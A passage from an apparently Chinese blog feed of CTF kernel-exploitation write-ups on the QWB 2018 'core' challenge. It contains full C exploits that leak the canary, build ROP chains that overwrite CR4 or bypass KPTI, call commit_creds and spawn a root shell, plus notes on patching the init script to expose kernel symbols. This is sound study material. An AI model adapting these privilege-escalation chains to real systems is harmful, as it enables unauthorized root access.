class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds = (<span class="hljs-type">void</span> *)addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of &quot;</span><br>                   <span class="hljs-string">&quot;commit_cred:\033[0m%p\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(!prepare_kernel_cred &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred = (<span class="hljs-type">void</span> *)addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of &quot;</span><br>                   <span class="hljs-string">&quot;prepare_kernel_cred:\033[0m%p\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;           <br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> offset;<br>    offset = (<span class="hljs-type">size_t</span>)commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-type">size_t</span> canary;<br>    set_off(fd, <span class="hljs-number">64</span>);<br>    core_read(fd, buf);<br>    canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-type">size_t</span> rop_chain[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>        rop_chain[i] = canary;<br>    rop_chain[i++] = MOV_RAX_CR4_ADD_RSP_8_POP_RBX_RET + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop_chain[i++] = POP_RDI_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0xffffffffffcfffff</span>;<br>    rop_chain[i++] = AND_RAX_RDI_RET + offset;<br>    rop_chain[i++] = MOV_CR4_RAX_PUSH_RCX_POPFQ_RET + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_privilige;<br>    rop_chain[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + offset + <span class="hljs-number">22</span>;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = user_sp + <span class="hljs-number">8</span>;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x100</span>);<br>    core_copy_func(fd, <span class="hljs-number">0xffffffffffff0000</span> | <span class="hljs-number">0x100</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>直接给cr4赋值的rop链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>    rop_chain[i] = canary;<br>rop_chain[i++] = POP_RAX_RET + offset;<br>rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0x6f0</span>;<br>rop_chain[i++] = MOV_CR4_RAX_PUSH_RCX_POPFQ_RET + offset;<br>rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_privilige;<br>rop_chain[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + offset + <span class="hljs-number">22</span>;<br>rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>rop_chain[i++] = user_cs;<br>rop_chain[i++] = user_rflags;<br>rop_chain[i++] = user_sp + <span class="hljs-number">8</span>;<br>rop_chain[i++] = user_ss;<br></code></pre></td></tr></table></figure><h3 id="KPTI绕过-纯ROP无ret2usr"><a href="#KPTI绕过-纯ROP无ret2usr" class="headerlink" title="KPTI绕过+纯ROP无ret2usr"></a>KPTI绕过+纯ROP无ret2usr</h3><p>就是利用swapgs_restore_regs_and_return_to_usermode没啥好说的，上exp！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a008da</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> *commit_creds = <span class="hljs-literal">NULL</span>, *prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><br>    <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);        <br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. &quot;</span><br>         <span class="hljs-string">&quot;Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889b</span>, buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> off)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889c</span>, off);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> nbytes)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889a</span>, nbytes);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    save_status();<br><br>    <span class="hljs-type">int</span> fd;<br>    fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the /proc/core !\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <br>    FILE *sym_table_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> addr;<br>    <span class="hljs-type">char</span> type[<span class="hljs-number">0x10</span>], buf[<span class="hljs-number">0x50</span>];<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%lx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds = (<span class="hljs-type">void</span> *)addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of &quot;</span><br>                   <span class="hljs-string">&quot;commit_cred:\033[0m%p\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(!prepare_kernel_cred &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred = (<span class="hljs-type">void</span> *)addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of &quot;</span><br>                   <span class="hljs-string">&quot;prepare_kernel_cred:\033[0m%p\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;           <br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> offset;<br>    offset = (<span class="hljs-type">size_t</span>)commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-type">size_t</span> canary;<br>    set_off(fd, <span class="hljs-number">64</span>);<br>    core_read(fd, buf);<br>    canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-type">size_t</span> rop_chain[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>        rop_chain[i] = canary;<br>    rop_chain[i++] = POP_RDI_RET + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)prepare_kernel_cred;<br>    rop_chain[i++] = POP_RDX_RET + offset;<br>    rop_chain[i++] = POP_RCX_RET + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)MOV_RDI_RAX_CALL_RDX + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)commit_creds;<br>    rop_chain[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + offset + <span class="hljs-number">0x16</span>;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = user_sp + <span class="hljs-number">8</span>;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x100</span>);<br>    core_copy_func(fd, <span class="hljs-number">0xffffffffffff0000</span> | <span class="hljs-number">0x100</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意两点：</p><ul><li><p>将pop_rcx_ret地址压入rdx：pop rcx（add rsp, 8）后ret就能继续执行之后的rop链，巧妙( •̀ ω •́ )✧</p></li><li><p>swapgs_restore_regs_and_return_to_usermode+0x16：如果直接从swapgs_restore_regs_and_return_to_usermode+0x36（mov rdi, cr3）开始执行之后pop rax会因为用户态无法访问内核态栈而报错</p><p>+0x16到+0x36之间的一系列操作相当于把栈移到用户态可以访问的内核空间并把栈上的内容一起移了过去，这样pop的时候就不会报错了</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>ROP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>rop</tag>
      
      <tag>ret2usr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kernel ROP basic</title>
    <link href="/2023/08/03/Kernel-ROP-basic/"/>
    <url>/2023/08/03/Kernel-ROP-basic/</url>
    
    <content type="html"><![CDATA[<p>Kernel！主要是复现arttnba3大佬的博客*★,°*:.☆(￣▽￣)&#x2F;$:*.°★* 。</p><p>ps：这道题是在老爹请客的那天做的，做的时候不断犯病且现在写博客的时候记忆几乎为零，所以重做一遍当作整理和回忆（最近记忆力真的好差不知道为什么&#x2F;(ㄒoㄒ)&#x2F;~~）</p><span id="more"></span><h1 id="Kernel-ROP-basic"><a href="#Kernel-ROP-basic" class="headerlink" title="Kernel ROP-basic"></a>Kernel ROP-basic</h1><p>整个提权的过程如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">状态保存-&gt;拿root权限-&gt;返回用户态-&gt;拿shell<br></code></pre></td></tr></table></figure><h2 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h2><p>先了解一下用户态和内核态的切换过程</p><h2 id="用户态→内核态"><a href="#用户态→内核态" class="headerlink" title="用户态→内核态"></a>用户态→内核态</h2><ul><li>切换GS段寄存器：swapgs切换GS寄存器，</li><li>保存用户态栈帧信息：记录rsp</li><li>保存用户态寄存器信息：通过 push 保存各寄存器值到栈上，以便后续“着陆”回用户态</li></ul><h3 id="内核态→用户态"><a href="#内核态→用户态" class="headerlink" title="内核态→用户态"></a>内核态→用户态</h3><p>恢复用户空间信息</p><ul><li><p>swapgs指令恢复用户态GS寄存器</p></li><li><p>iretq恢复到用户空间，iretq栈布局如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">|----------------------|<br>| RIP                  |&lt;== low mem<br>|----------------------|<br>| CS                   |<br>|----------------------|<br>| RFLAGS               |<br>|----------------------|<br>| RSP                  |<br>|----------------------|<br>| SS                   |&lt;== high mem<br>|----------------------|<br></code></pre></td></tr></table></figure></li></ul><p>所以需要保存以下寄存器的值：eflags（状态标志寄存器）、cs（代码段寄存器）、rsp和ss（栈段寄存器）</p><p>状态保存函数（使用内联汇编，编译时需指定参数-masm&#x3D;intel）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span><span class="hljs-comment">//标志进栈指令，将标志寄存器的值压入堆栈顶部</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="拿root权限"><a href="#拿root权限" class="headerlink" title="拿root权限"></a>拿root权限</h2><p>通过构造ROP链执行函数commit_creds(prepare_kernel_cred(&amp;init_task))或commit_creds(&amp;init_cred)（老版本commit_creds(prepare_kernel_cred(NULL))）</p><h2 id="返回用户态，拿shell"><a href="#返回用户态，拿shell" class="headerlink" title="返回用户态，拿shell"></a>返回用户态，拿shell</h2><p>根据👆iretq栈布局，ROP链的构造如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">↓   swapgs<br>    iretq<br>    user_shell_addr<span class="hljs-comment">//system(&quot;/bin/sh&quot;)地址</span><br>    user_cs<br>    user_rflags<br>    user_sp<br>    user_ss<br></code></pre></td></tr></table></figure><h2 id="例题：强网杯2018-core"><a href="#例题：强网杯2018-core" class="headerlink" title="例题：强网杯2018-core"></a>例题：强网杯2018-core</h2><h3 id="启动初始化脚本分析"><a href="#启动初始化脚本分析" class="headerlink" title="启动初始化脚本分析"></a>启动初始化脚本分析</h3><p>先看启动脚本，start.sh（更改过的）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 \<br>-m 256M \<br>-kernel ./bzImage \<br>-initrd  ./core.cpio \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \<br>--nographic \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 #\<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-S -gdb tcp::1234</span><br></code></pre></td></tr></table></figure><p>启动不起来的时候改一下分配的内存</p><ul><li>开启了KASLR保护（地址随机化）</li></ul><p>打包解包相关命令</p><ul><li><p>解包命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cpio -idmv &lt; core.cpio<br></code></pre></td></tr></table></figure></li><li><p>打包命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find . | cpio -o --format=newc &gt; ../../core.cpio<br></code></pre></td></tr></table></figure></li></ul><p>查看init文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br>mount -t devtmpfs none /dev<br>/sbin/mdev -s<br>mkdir -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br>chmod 666 /dev/ptmx<br>cat /proc/kallsyms &gt; /tmp/kallsyms<br>echo 1 &gt; /proc/sys/kernel/kptr_restrict<br>echo 1 &gt; /proc/sys/kernel/dmesg_restrict<br>ifconfig eth0 up<br>udhcpc -i eth0<br>ifconfig eth0 10.0.2.15 netmask 255.255.255.0<br>route add default gw 10.0.2.2 <br>insmod /core.ko<br><br>poweroff -d 120 -f &amp;<br>setsid /bin/cttyhack setuidgid 1000 /bin/sh<br>echo &#x27;sh end!\n&#x27;<br>umount /proc<br>umount /sys<br><br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure><ul><li>kptr_restrict<ul><li>0：root和普通用户都可以读取内核符号地址（&#x2F;proc&#x2F;kallsyms接口）</li><li>1：root用户有权限读取, 普通用户没有权限</li><li>2：内核将符号地址打印为全0, root和普通用户都没有权限</li></ul></li><li>但将kptr_restrict置为0还是不能读取内核符号地址，还需要将perf_event_paranoid置0</li></ul><p>更改后的init脚本（需要查看函数地址以便进行调试）如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br>mount -t devtmpfs none /dev<br>/sbin/mdev -s<br>mkdir -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br>chmod 666 /dev/ptmx<br>echo 0 &gt; /proc/sys/kernel/kptr_restrict#更改<br>echo 1 &gt; /proc/sys/kernel/dmesg_restrict<br>echo 0 &gt; /proc/sys/kernel/perf_event_paranoid#增加<br>cat /proc/kallsyms &gt; /tmp/kallsyms<br>ifconfig eth0 up<br>udhcpc -i eth0<br>ifconfig eth0 10.0.2.15 netmask 255.255.255.0<br>route add default gw 10.0.2.2 <br>insmod /core.ko<br><br>poweroff -d 120 -f &amp;<br>setsid /bin/cttyhack setuidgid 1000 /bin/sh<br>echo &#x27;sh end!\n&#x27;<br>umount /proc<br>umount /sys<br><br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure><ul><li>开始时内核符号表被复制了一份到&#x2F;tmp&#x2F;kalsyms中，利用这个我们可以获得内核中所有函数的地址</li><li>core.ko就是存在漏洞的内核模块</li><li>改变权限前设置了定时关机poweroff -d 120 -f，调试的时候可以把时间改长（注释掉会启动不了，我也不知道为什么）</li></ul><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p>编译指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc ./exploit.c -o exploit -static -masm=intel<br></code></pre></td></tr></table></figure><p>分析过程就不写了，大佬博客里都有，只贴一个exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 